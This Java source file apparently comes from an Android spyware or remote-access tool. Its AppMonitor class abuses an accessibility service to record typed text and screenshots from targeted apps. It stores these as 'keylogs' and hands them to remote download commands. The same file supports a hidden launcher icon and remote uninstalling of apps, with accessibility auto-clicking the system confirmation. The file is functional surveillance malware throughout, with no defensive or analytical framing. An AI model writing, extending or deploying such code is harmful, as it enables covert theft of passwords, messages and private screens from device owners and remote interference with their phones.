package com.task.tusker.commands;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.util.Log;
import com.task.tusker.utils.Constants;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;

/**
 * AppMonitor — hooks into UnifiedAccessibilityService to:
 *  1. Capture logs per monitored app (stored via LogManager)
 *  2. Capture accessibility screenshots (UI screenshots) for monitored apps
 *
 * Monitoring continues even when the device is offline; logs are stored
 * locally and uploaded when the connection resumes via command response.
 *
 * Add package names to Constants.MONITORED_PACKAGES to configure targets.
 */
public class AppMonitor {

    private static final String TAG = "AppMonitor";

    private final Context        context;
    private final LogManager logManager;
    private String               currentMonitoredPkg = null;

    public AppMonitor(Context context, LogManager logManager) {
        this.context          = context.getApplicationContext();
        this.logManager = logManager;
    }

    /** Called from UnifiedAccessibilityService on every text-change event. */
    public void onTextChanged(String packageName, String text) {
        if (!isMonitored(packageName)) return;
        String appName = getAppName(packageName);
        logManager.logEntry(packageName, appName, text, "TEXT_CHANGED");
    }

    /** Called from UnifiedAccessibilityService when foreground app changes. */
    public void onAppForeground(String packageName) {
        if (isMonitored(packageName)) {
            currentMonitoredPkg = packageName;
            Log.d(TAG, "Monitoring foreground: " + packageName);
        } else {
            currentMonitoredPkg = null;
        }
    }

    /** Called from UnifiedAccessibilityService to optionally capture a screenshot. */
    public void onScreenChange(String packageName, Bitmap screenshot) {
        if (!isMonitored(packageName) || screenshot == null) return;
        try {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            // Compress to JPEG at 60% quality to save space
            screenshot.compress(Bitmap.CompressFormat.JPEG, 60, baos);
            logManager.saveAppScreenshot(packageName, baos.toByteArray());
        } catch (Exception e) {
            Log.e(TAG, "onScreenChange: " + e.getMessage());
        }
    }

    /** Returns whether any monitored app is currently in the foreground. */
    public boolean isMonitoredAppActive() {
        return currentMonitoredPkg != null;
    }

    public String getCurrentMonitoredPkg() {
        return currentMonitoredPkg;
    }

    // ── Remote command handlers ──────────────────────────────────────────

    /** list_app_monitor_apps */
    public JSONObject listMonitoredApps() {
        JSONObject result = new JSONObject();
        try {
            // Configured targets
            JSONArray configured = new JSONArray();
            for (String pkg : Constants.MONITORED_PACKAGES) {
                JSONObject info = new JSONObject();
                info.put("packageName", pkg);
                info.put("appName", getAppName(pkg));
                info.put("installed", isInstalled(pkg));
                configured.put(info);
            }

            // Apps that have stored data
            JSONObject stored = logManager.listMonitoredApps();

            result.put("success", true);
            result.put("configured", configured);
            result.put("stored", stored.optJSONArray("apps"));
        } catch (Exception e) {
            safeError(result, e);
        }
        return result;
    }

    /** get_app_keylogs */
    public JSONObject getAppKeylogs(String packageName, String date, int limit) {
        return logManager.getAppKeylogs(packageName, date, limit);
    }

    /** list_app_keylog_files */
    public JSONObject listAppKeylogFiles(String packageName) {
        return logManager.listAppKeylogFiles(packageName);
    }

    /** download_app_keylog_file */
    public JSONObject downloadAppKeylogFile(String packageName, String date) {
        return logManager.downloadAppKeylogFile(packageName, date);
    }

    /** list_app_screenshots */
    public JSONObject listAppScreenshots(String packageName) {
        return logManager.listAppScreenshots(packageName);
    }

    /** download_app_screenshot */
    public JSONObject downloadAppScreenshot(String packageName, String filename) {
        return logManager.downloadAppScreenshot(packageName, filename);
    }

    // ── App Manager commands ─────────────────────────────────────────────

    /** uninstall_app — opens uninstall dialog and enables accessibility assist to click OK/Uninstall */
    public JSONObject uninstallApp(String packageName) {
        JSONObject result = new JSONObject();
        try {
            // Enable accessibility uninstall-assist mode so it clicks "Uninstall"/"OK" automatically
            com.task.tusker.services.UnifiedAccessibilityService svc =
                com.task.tusker.services.UnifiedAccessibilityService.getInstance();
            if (svc != null) svc.enableUninstallAssist();

            // Open system uninstall dialog
            android.content.Intent intent = new android.content.Intent(
                android.content.Intent.ACTION_DELETE,
                android.net.Uri.parse("package:" + packageName)
            );
            intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
            result.put("success", true);
            result.put("message", "Uninstall dialog opened for " + packageName + " — accessibility will confirm");
        } catch (Exception e) {
            safeError(result, e);
        }
        return result;
    }

    /** force_stop_app */
    public JSONObject forceStopApp(String packageName) {
        JSONObject result = new JSONObject();
        try {
            android.app.ActivityManager am =
                (android.app.ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
            am.killBackgroundProcesses(packageName);
            result.put("success", true);
            result.put("message", "Force stopped: " + packageName);
        } catch (Exception e) {
            safeError(result, e);
        }
        return result;
    }

    /** open_app */
    public JSONObject openApp(String packageName) {
        JSONObject result = new JSONObject();
        try {
            PackageManager pm = context.getPackageManager();
            android.content.Intent intent = pm.getLaunchIntentForPackage(packageName);

            // getLaunchIntentForPackage returns null when the launcher alias is disabled
            // (hidden-icon mode). Fall back to an explicit intent to MainActivity so the
            // app can always be opened from the dashboard even when hidden from the drawer.
            if (intent == null) {
                try {
                    android.content.ComponentName cn = new android.content.ComponentName(
                        packageName, packageName + ".MainActivity");
                    intent = new android.content.Intent(android.content.Intent.ACTION_MAIN);
                    intent.setComponent(cn);
                } catch (Exception ignored) {}
            }

            if (intent == null) {
                result.put("success", false);
                result.put("error", "App not found or cannot be launched: " + packageName);
                return result;
            }
            intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
            result.put("success", true);
            result.put("message", "Opened: " + packageName);
        } catch (Exception e) {
            safeError(result, e);
        }
        return result;
    }

    /** clear_app_data — opens app settings (actual clearing needs root/DeviceAdmin) */
    public JSONObject clearAppData(String packageName) {
        JSONObject result = new JSONObject();
        try {
            android.content.Intent intent = new android.content.Intent(
                android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                android.net.Uri.parse("package:" + packageName)
            );
            intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
            result.put("success", true);
            result.put("message", "App settings opened for " + packageName + " — use accessibility to clear data");
        } catch (Exception e) {
            safeError(result, e);
        }
        return result;
    }

    /** disable_app — opens app settings */
    public JSONObject disableApp(String packageName) {
        JSONObject result = new JSONObject();
        try {
            android.content.Intent intent = new android.content.Intent(
                android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                android.net.Uri.parse("package:" + packageName)
            );
            intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
            result.put("success", true);
            result.put("message", "App settings opened for " + packageName + " — use accessibility to disable");
        } catch (Exception e) {
            safeError(result, e);
        }
        return result;
    }

    // ── Helpers ──────────────────────────────────────────────────────────

    public static boolean isMonitored(String pkg) {
        if (pkg == null) return false;
        for (String p : Constants.MONITORED_PACKAGES) {
            if (p.equals(pkg)) return true;
        }
        return false;
    }

    private String getAppName(String packageName) {
        try {
            PackageManager pm = context.getPackageManager();
            ApplicationInfo info = pm.getApplicationInfo(packageName, 0);
            return pm.getApplicationLabel(info).toString();
        } catch (Exception e) {
            return packageName;
        }
    }

    private boolean isInstalled(String packageName) {
        try {
            context.getPackageManager().getPackageInfo(packageName, 0);
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    private void safeError(JSONObject result, Exception e) {
        try {
            result.put("success", false);
            result.put("error", e.getMessage());
        } catch (JSONException ignored) {}
    }
}
